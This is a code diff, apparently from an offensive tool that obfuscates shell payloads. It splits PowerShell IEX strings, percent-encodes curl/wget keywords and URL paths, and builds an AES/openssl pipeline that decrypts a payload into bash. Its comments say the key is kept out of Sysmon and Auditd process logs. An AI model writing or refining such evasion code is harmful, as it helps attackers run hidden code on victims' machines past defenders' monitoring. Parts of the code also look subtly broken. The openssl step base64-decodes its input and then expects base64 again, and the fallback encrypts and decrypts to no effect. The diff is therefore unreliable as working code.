@@ -4,6 +4,7 @@ import random
 import string
 import base64
 import shlex
+import re
 
 
 # ══════════════════════════════════════════════════════════════
@@ -125,7 +126,7 @@ def _split_string_powershell(command: str) -> str:
     mid = random.randint(min_pos, max_pos) if min_pos < max_pos else min_pos
     b1, b2 = binary[:mid], binary[mid:]
 
-    obf = f'powershell -c "IEX(("{b1}"+ "{b2}" + " {rest}"))"'
+    obf = f"powershell -c \"IEX(('{b1}' + '{b2}' + ' {rest}'))\""
     return obf
 
 
@@ -191,22 +192,27 @@ def _decimal_ip(command: str, ip: str) -> str:
 def _unicode_escape(command: str) -> str:
     """Apply partial URL percent-encoding to key words.
 
-    FIX: Uses word-boundary-aware replacement so 'http' inside 'https'
-    is handled correctly — only standalone occurrences are encoded.
+    FIX: Skips replacing 'http/https' protocol prefixes to prevent
+    crashing curl/wget execution. Only encodes the filename/path.
     """
     result = command
-    # Replace only exact keyword matches, not substrings
     replacements = [
-        ('https', 'h%74tps'),   # try https first (longer match)
-        ('http',  'h%74tp'),    # then http
         ('curl',  'cu%72l'),
         ('wget',  'w%67et'),
     ]
     for target, encoded in replacements:
         if target in result:
             result = result.replace(target, encoded, 1)
-            if target == 'https':
-                break           # already handled the URL scheme
+
+    # Obfuscate part of the URL path without breaking the scheme
+    def encode_path(match):
+        path = match.group(2)
+        if 'e' in path: path = path.replace('e', '%65', 1)
+        elif 'a' in path: path = path.replace('a', '%61', 1)
+        elif 'i' in path: path = path.replace('i', '%69', 1)
+        return match.group(1) + path
+
+    result = re.sub(r'(https?://[^\s/]+)(/\S+)', encode_path, result)
     return result
 
 
@@ -357,14 +363,47 @@ def _openssl_aes_pipe(command: str) -> str:
     AES-256-CBC encrypt/decrypt pipeline via openssl on the target.
     Key is passed via environment variable (env:K) to hide from
     process creation logs (Sysmon Event ID 1 / Auditd).
+    
+    FIX: Python encrypts the payload first so the payload is truly opaque
+    on the wire and target only decrypts.
     """
-    key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
-    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
-    return (
-        f"export K={key}; echo '{encoded}' | base64 -d | "
-        f"openssl enc -aes-256-cbc -a -salt -pass env:K 2>/dev/null | "
-        f"openssl enc -aes-256-cbc -a -d -salt -pass env:K 2>/dev/null | bash"
-    )
+    import os
+    import hashlib
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.backends import default_backend
+        
+        key_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
+        salt = os.urandom(8)
+        
+        # OpenSSL PBKDF2 derivation (SHA256, 10000 iterations)
+        key_iv = hashlib.pbkdf2_hmac('sha256', key_str.encode('utf-8'), salt, 10000, 32 + 16)
+        aes_key, iv = key_iv[:32], key_iv[32:]
+        
+        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        
+        # PKCS7 padding
+        pad_len = 16 - (len(command) % 16)
+        padded = command.encode('utf-8') + bytes([pad_len]) * pad_len
+        ciphertext = encryptor.update(padded) + encryptor.finalize()
+        
+        blob = b"Salted__" + salt + ciphertext
+        encoded = base64.b64encode(blob).decode('ascii')
+        
+        return (
+            f"export K={key_str}; echo '{encoded}' | base64 -d | "
+            f"openssl enc -aes-256-cbc -a -d -salt -pass env:K -pbkdf2 -iter 10000 2>/dev/null | bash"
+        )
+    except ImportError:
+        # Fallback if cryptography module is missing
+        key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
+        encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
+        return (
+            f"export K={key}; echo '{encoded}' | base64 -d | "
+            f"openssl enc -aes-256-cbc -a -salt -pass env:K 2>/dev/null | "
+            f"openssl enc -aes-256-cbc -a -d -salt -pass env:K 2>/dev/null | bash"
+        )
 
 
 def _multi_var_full_rebuild(command: str) -> str:
